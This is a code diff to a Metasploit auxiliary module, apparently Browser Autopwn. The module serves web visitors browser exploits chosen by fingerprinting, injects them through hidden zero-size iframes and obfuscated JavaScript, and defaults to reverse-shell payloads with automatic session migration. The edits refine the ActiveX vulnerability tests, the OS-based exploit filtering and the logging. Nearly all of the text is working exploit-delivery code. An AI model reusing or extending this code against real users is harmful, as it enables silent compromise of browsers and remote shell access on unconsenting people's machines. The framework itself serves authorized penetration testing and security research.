@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 # ideas:
@@ -60,6 +60,11 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'PassiveActions' =>
 				[ 'WebServer', 'DefangedDetection' ],
+			'DefaultOptions' => {
+					# We know that most of these exploits will crash the browser, so
+					# set the default to run migrate right away if possible.
+					"InitialAutoRunScript" => "migrate -f",
+				},
 			'DefaultAction'  => 'WebServer'))
 
 		register_options([
@@ -69,9 +74,6 @@ class Metasploit3 < Msf::Auxiliary
 		], self.class)
 
 		register_advanced_options([
-			# We know that most of these exploits will crash the browser, so
-			# set the default to run migrate right away if possible.
-			OptString.new('InitialAutoRunScript', [false, "An initial script to run on session created (before AutoRunScript)",  'migrate -f']),
 			OptString.new('AutoRunScript', [false, "A script to automatically on session creation.", '']),
 			OptBool.new('AutoSystemInfo', [true, "Automatically capture system information on initialization.", true]),
 			OptString.new('MATCH', [false,
@@ -109,7 +111,7 @@ class Metasploit3 < Msf::Auxiliary
 				'The port to use for generic reverse-connect payloads', 6666
 			]),
 			OptString.new('PAYLOAD_GENERIC', [false,
-				'The payload to use for generic reverse-connect payloads6',
+				'The payload to use for generic reverse-connect payloads',
 				'generic/shell_reverse_tcp'
 			]),
 			OptPort.new('LPORT_JAVA', [false,
@@ -223,27 +225,14 @@ class Metasploit3 < Msf::Auxiliary
 			}
 
 			function bodyOnLoad() {
-				var detected_version = getVersion();
+				var detected_version = window.os_detect.getVersion();
 				//#{js_debug('detected_version')}
 				report_and_get_exploits(detected_version);
 			} // function bodyOnLoad
 		ENDJS
 
 		if (datastore['DEBUG'])
-			print_status("Adding debug code")
-			@init_js << <<-ENDJS
-				if (!(typeof(debug) == 'function')) {
-					function htmlentities(str) {
-						str = str.replace(/>/g, '&gt;');
-						str = str.replace(/</g, '&lt;');
-						str = str.replace(/&/g, '&amp;');
-						return str;
-					}
-					function debug(msg) {
-						document.body.innerHTML += (msg + "<br />\\n");
-					}
-				}
-			ENDJS
+			print_debug("NOTE: Debug Mode; javascript will not be obfuscated")
 		else
 			pre = Time.now
 			print_status("Obfuscating initial javascript #{pre}")
@@ -257,6 +246,7 @@ class Metasploit3 < Msf::Auxiliary
 		@init_html << %Q|<!-- \n #{@init_js} //-->|
 		@init_html << %Q|</script> </head> |
 		@init_html << %Q|<body onload="#{@init_js.sym("bodyOnLoad")}()"> |
+		@init_html << %Q|<div id="foo"></div> |
 		@init_html << %Q|<noscript> \n|
 		# Don't use build_iframe here because it will break detection in
 		# DefangedDetection mode when the target has js disabled.
@@ -419,20 +409,21 @@ class Metasploit3 < Msf::Auxiliary
 			if apo[:classid]
 				# Then this is an IE exploit that uses an ActiveX control,
 				# build the appropriate tests for it.
-				method = apo[:vuln_test].dup
 				apo[:vuln_test] = ""
 				apo[:ua_name] = HttpClients::IE
+				conditions = []
 				if apo[:classid].kind_of?(Array)  # then it's many classids
 					apo[:classid].each { |clsid|
-						apo[:vuln_test] << "if (testAXO('#{clsid}', '#{method}')) {\n"
-						apo[:vuln_test] << " is_vuln = true;\n"
-						apo[:vuln_test] << "}\n"
+						if apo[:method].kind_of?(Array)  # then it's many methods
+							conditions += apo[:method].map { |m| "testAXO('#{clsid}', '#{m}')" }
+						else
+							conditions.push "testAXO('#{clsid}', '#{method}')"
+						end
 					}
-				else
-					apo[:vuln_test] << "if (testAXO('#{apo[:classid]}', '#{method}')) {\n"
-					apo[:vuln_test] << " is_vuln = true;\n"
-					apo[:vuln_test] << "}\n"
 				end
+				apo[:vuln_test] << "if (#{conditions.join("||")}) {\n"
+				apo[:vuln_test] << " is_vuln = true;\n"
+				apo[:vuln_test] << "}\n"
 			end
 
 			# If the exploit supplies a min/max version, build up a test to
@@ -530,7 +521,7 @@ class Metasploit3 < Msf::Auxiliary
 	# Main dispatcher method for when we get a request
 	#
 	def on_request_uri(cli, request)
-		print_status("#{cli.peerhost.ljust 16} Browser Autopwn request '#{request.uri}'")
+		print_status("Handling '#{request.uri}'")
 
 		case request.uri
 		when self.get_resource
@@ -552,7 +543,6 @@ class Metasploit3 < Msf::Auxiliary
 				response = create_response()
 				response.body = "#{js_debug("'Please wait'")}"
 			else
-				print_status("Responding with exploits")
 				response = build_script_response(cli, request)
 			end
 			response["Expires"] = "0"
@@ -565,13 +555,12 @@ class Metasploit3 < Msf::Auxiliary
 			# detection, which is kind of a bummer since it's so easy for the
 			# ua string to lie.  It probably doesn't matter that much because
 			# most of our exploits require javascript anyway.
-			print_status("#{cli.peerhost.ljust 16} Browser has javascript disabled, trying exploits that don't need it")
+			print_status("Browser has javascript disabled, trying exploits that don't need it")
 			record_detection(cli, request)
 			if (action.name == "DefangedDetection")
 				response = create_response()
 				response.body = "Please wait"
 			else
-				print_status("Responding with non-javascript exploits")
 				response = build_noscript_response(cli, request)
 			end
 
@@ -579,7 +568,7 @@ class Metasploit3 < Msf::Auxiliary
 			response["Cache-Control"] = "must-revalidate"
 			cli.send_response(response)
 		else
-			print_status("#{cli.peerhost.ljust 16} 404ing #{request.uri}")
+			print_status("404ing #{request.uri}")
 			send_not_found(cli)
 			return false
 		end
@@ -603,6 +592,7 @@ class Metasploit3 < Msf::Auxiliary
 		client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent'])
 		body = ""
 
+		sploit_cnt = 0
 		@noscript_tests.each { |browser, sploits|
 			next if sploits.length == 0
 
@@ -611,7 +601,9 @@ class Metasploit3 < Msf::Auxiliary
 			sploits.each do |s|
 				body << html_for_exploit( s, client_info )
 			end
+			sploit_cnt += 1
 		}
+		print_status("Responding with #{sploit_cnt} non-javascript exploits")
 		body
 	end
 
@@ -641,8 +633,11 @@ class Metasploit3 < Msf::Auxiliary
 		response['Expires'] = '0'
 		response['Cache-Control'] = 'must-revalidate'
 
-		host_info   = get_host(:host => cli.peerhost)
+		# Host info no longer comes from the database! This is strictly a value
+		# that came back from javascript OS detection because NAT basically
+		# makes it impossible to keep host/client mappings straight.
 		client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent'])
+		host_info   = client_info[:host]
 		#print_status("Client info: #{client_info.inspect}")
 
 		js = "var global_exploit_list = []\n";
@@ -661,7 +656,7 @@ class Metasploit3 < Msf::Auxiliary
 			# two methods should succeed if the object with the given
 			# classid can be created.
 			js << <<-ENDJS
-				function testAXO(axo_name, method) {
+				window.testAXO = function(axo_name, method) {
 					if (axo_name.substring(0,1) == String.fromCharCode(123)) {
 						axobj = document.createElement("object");
 						axobj.setAttribute("classid", "clsid:" + axo_name);
@@ -682,7 +677,9 @@ class Metasploit3 < Msf::Auxiliary
 						try {
 							axobj = new ActiveXObject(axo_name);
 						} catch(e) {
-							axobj = '';
+							// If we can't build it with an object tag and we can't build it
+							// with ActiveXObject, it can't be built.
+							return false;
 						};
 					}
 					#{js_debug('axo_name + "." + method + " = " + typeof axobj[method] + "<br/>"')}
@@ -690,14 +687,14 @@ class Metasploit3 < Msf::Auxiliary
 						return true;
 					}
 					return false;
-				}
+				};
 			ENDJS
 			# End of IE-specific test functions
 		end
 		# Generic stuff that is needed regardless of what browser was detected.
 		js << <<-ENDJS
 			var written_iframes = new Array();
-			function write_iframe(myframe) {
+			window.write_iframe = function (myframe) {
 				var iframe_idx; var mybody;
 				for (iframe_idx in written_iframes) {
 					if (written_iframes[iframe_idx] == myframe) {
@@ -708,47 +705,59 @@ class Metasploit3 < Msf::Auxiliary
 				str = '';
 				str += '<iframe src="' + myframe + '" style="visibility:hidden" height="0" width="0" border="0"></iframe>';
 				document.body.innerHTML += (str);
-			}
-			function next_exploit(exploit_idx) {
-				#{js_debug("'next_exploit(' + exploit_idx +')'")}
+			};
+			window.next_exploit = function(exploit_idx) {
+				#{js_debug("'next_exploit(' + exploit_idx +')<br>'")}
 				if (!global_exploit_list[exploit_idx]) {
-					#{js_debug("'End'")}
+					#{js_debug("'End<br>'")}
 					return;
 				}
-				#{js_debug("'trying ' + global_exploit_list[exploit_idx].resource + '<br>'")}
+				#{js_debug("'trying ' + global_exploit_list[exploit_idx].resource + ' of ' + global_exploit_list.length + '<br>'")}
 				// Wrap all of the vuln tests in a try-catch block so a
 				// single borked test doesn't prevent other exploits
 				// from working.
 				try {
 					var test = global_exploit_list[exploit_idx].test;
+					// Debugging
+					//tn = document.createTextNode("Test " + exploit_idx +"\\n");
+					//br = document.createElement("br");
+					//document.body.appendChild(tn);
+					//document.body.appendChild(br);
+					//tn = document.createTextNode(test);
+					//document.body.appendChild(tn);
 					if (!test) {
 						test = "true";
-					} else {
-						test = "try {" + test + "} catch (e) { is_vuln = false; }; is_vuln";
 					}
 
 					if (eval(test)) {
 						#{js_debug("'test says it is vuln, writing iframe for ' + global_exploit_list[exploit_idx].resource + '<br>'")}
-						write_iframe(global_exploit_list[exploit_idx].resource);
-						setTimeout("next_exploit(" + (exploit_idx+1).toString() + ")", 1000);
+						window.write_iframe(global_exploit_list[exploit_idx].resource);
+						setTimeout("window.next_exploit(" + (exploit_idx+1).toString() + ")", 1000);
 					} else {
 						#{js_debug("'this client does not appear to be vulnerable to ' + global_exploit_list[exploit_idx].resource + '<br>'")}
-						next_exploit(exploit_idx+1);
+						window.next_exploit(exploit_idx+1);
 					}
 				} catch(e) {
-					#{js_debug("'test threw an exception, trying next one'")}
-					next_exploit(exploit_idx+1);
+					#{js_debug("'test threw an exception: ' + e.message + '<br />'")}
+					window.next_exploit(exploit_idx+1);
 				};
-			}
+			};
 		ENDJS
 
+		sploits_for_this_client = []
+		sploit_cnt = 0
 		# if we have no client_info, this will add all tests. Otherwise tries
 		# to only send tests for exploits that target the client's detected
 		# browser.
 		@js_tests.each { |browser, sploits|
 			next unless client_matches_browser(client_info, browser)
 
-			if (client_info.nil? || [nil, browser].include?(client_info[:ua_name]))
+			# Send all the generics regardless of what the client is. If the
+			# client is nil, then we don't know what it really is, so just err
+			# on the side of shells and send everything. Otherwise, send only
+			# if the client is using the browser associated with this set of
+			# exploits.
+			if (browser == "generic" || client_info.nil? || [nil, browser].include?(client_info[:ua_name]))
 				sploits.each do |s|
 					if s[:vuln_test].nil? or s[:vuln_test].empty?
 						test = "is_vuln = true"
@@ -761,18 +770,22 @@ class Metasploit3 < Msf::Auxiliary
 
 					# Skip exploits that don't match the client's OS.
 					if (host_info and host_info[:os_name] and s[:os_name])
-						# Host os normalization will set os_name to "Unknown"
-						# if it has no fingerprinting info.
-						#
-						# See lib/msf/core/model/host.rb
-						if host_info[:os_name] != "Unknown"
-							next unless s[:os_name].include?(host_info[:os_name])
+						# Reject exploits whose OS doesn't match that of the
+						# victim. Note that host_info comes from javascript OS
+						# detection, NOT the database.
+						if host_info[:os_name] != "undefined"
+							unless s[:os_name].include?(host_info[:os_name])
+								vprint_status("Rejecting #{s[:name]} for non-matching OS")
+								next
+							end
 						end
 					end
 					js << "global_exploit_list[global_exploit_list.length] = {\n"
 					js << "  'test':'#{test}',\n"
 					js << "  'resource':'#{res}'\n"
 					js << "};\n"
+					sploits_for_this_client.push s[:name]
+					sploit_cnt += 1
 				end
 			end
 		}
@@ -796,6 +809,8 @@ class Metasploit3 < Msf::Auxiliary
 					# check for in javascript, throw it on the pile.
 					noscript_html << html_for_exploit(s, client_info)
 				end
+				sploits_for_this_client.push s[:name]
+				sploit_cnt += 1
 			end
 		}
 
@@ -805,17 +820,24 @@ class Metasploit3 < Msf::Auxiliary
 		js << Rex::Text.to_hex(noscript_html, "%")
 		js << %Q|";\n|
 		js << %Q|var noscript_div = document.createElement("div");\n|
+		# Have to use innerHTML here to render the new iframes. Using
+		# document.createElement and appendChild() will escape all the
+		# entities.
 		js << %Q|noscript_div.innerHTML = unescape(noscript_exploits);\n|
 		js << %Q|document.body.appendChild(noscript_div);\n|
 
-		js << "#{js_debug("'starting exploits<br>'")}\n"
-		js << "next_exploit(0);\n"
+		js << "#{js_debug("'starting exploits (' + global_exploit_list.length + ' total)<br>'")}\n"
+		js << "window.next_exploit(0);\n"
 
 		js = ::Rex::Exploitation::JSObfu.new(js)
-		js.obfuscate
+		js.obfuscate unless datastore["DEBUG"]
 
 		response.body = "#{js}"
 
+		print_status("Responding with #{sploit_cnt} exploits")
+		sploits_for_this_client.each do |name|
+			vprint_status("* #{name}")
+		end
 		return response
 	end
 
@@ -853,6 +875,7 @@ class Metasploit3 < Msf::Auxiliary
 	def client_matches_browser(client_info, browser)
 		if client_info and browser and client_info[:ua_name]
 			if browser != "generic" and  client_info[:ua_name] != browser
+				vprint_status("Rejecting exploits for #{browser}")
 				return false
 			end
 		end
@@ -882,14 +905,14 @@ class Metasploit3 < Msf::Auxiliary
 			# roughly the same as the javascript version on non-IE
 			# browsers because it does most everything with
 			# navigator.userAgent
-			print_status("#{cli.peerhost.ljust 16} Recording detection from User-Agent: #{request['User-Agent']}")
+			print_status("Recording detection from User-Agent: #{request['User-Agent']}")
 			report_user_agent(cli.peerhost, request)
 		else
 			data_offset += 'sessid='.length
 			detected_version = request.uri[data_offset, request.uri.length]
 			if (0 < detected_version.length)
 				detected_version = Rex::Text.decode_base64(Rex::Text.uri_decode(detected_version))
-				print_status("#{cli.peerhost.ljust 16} JavaScript Report: #{detected_version}")
+				print_status("JavaScript Report: #{detected_version}")
 				(os_name, os_flavor, os_sp, os_lang, arch, ua_name, ua_ver) = detected_version.split(':')
 
 				if framework.db.active
@@ -899,21 +922,32 @@ class Metasploit3 < Msf::Auxiliary
 					note_data[:os_sp]     = os_sp     if os_sp != "undefined"
 					note_data[:os_lang]   = os_lang   if os_lang != "undefined"
 					note_data[:arch]      = arch      if arch != "undefined"
-					print_status("#{cli.peerhost.ljust 16} Reporting: #{note_data.inspect}")
+					print_status("Reporting: #{note_data.inspect}")
 
-					report_note({
-						:host => cli.peerhost,
-						:type => 'javascript_fingerprint',
-						:data => note_data,
-						:update => :unique_data,
-					})
-					client_info = ({
-						:host      => cli.peerhost,
-						:ua_string => request['User-Agent'],
-						:ua_name   => ua_name,
-						:ua_ver    => ua_ver
-					})
-					report_client(client_info)
+					# Reporting stuff isn't really essential since we store all
+					# the target information locally.  Make sure any exception
+					# raised from the report_* methods doesn't prevent us from
+					# sending exploits.  This is really only an issue for
+					# connections from localhost where we end up with
+					# ActiveRecord::RecordInvalid errors because 127.0.0.1 is
+					# blacklisted in the Host validations.
+					begin
+						report_note({
+							:host => cli.peerhost,
+							:type => 'javascript_fingerprint',
+							:data => note_data,
+							:update => :unique_data,
+						})
+						client_info = {
+							:host      => cli.peerhost,
+							:ua_string => request['User-Agent'],
+							:ua_name   => ua_name,
+							:ua_ver    => ua_ver
+						}
+						report_client(client_info)
+					rescue => e
+						elog("Reporting failed: #{e.class} : #{e.message}")
+					end
 				end
 			end
 		end
@@ -940,6 +974,13 @@ class Metasploit3 < Msf::Auxiliary
 		@targetcache[key][:ua_string] = request['User-Agent']
 		@targetcache[key][:ua_name] = ua_name
 		@targetcache[key][:ua_ver] = ua_ver
+
+		@targetcache[key][:host] = {}
+		@targetcache[key][:host][:os_name] = os_name
+		@targetcache[key][:host][:os_flavor] = os_flavor
+		@targetcache[key][:host][:os_sp] = os_sp
+		@targetcache[key][:host][:os_lang] = os_lang
+
 	end
 
 	# Override super#get_client to use a cache since the database is generally
@@ -993,4 +1034,3 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 end
-
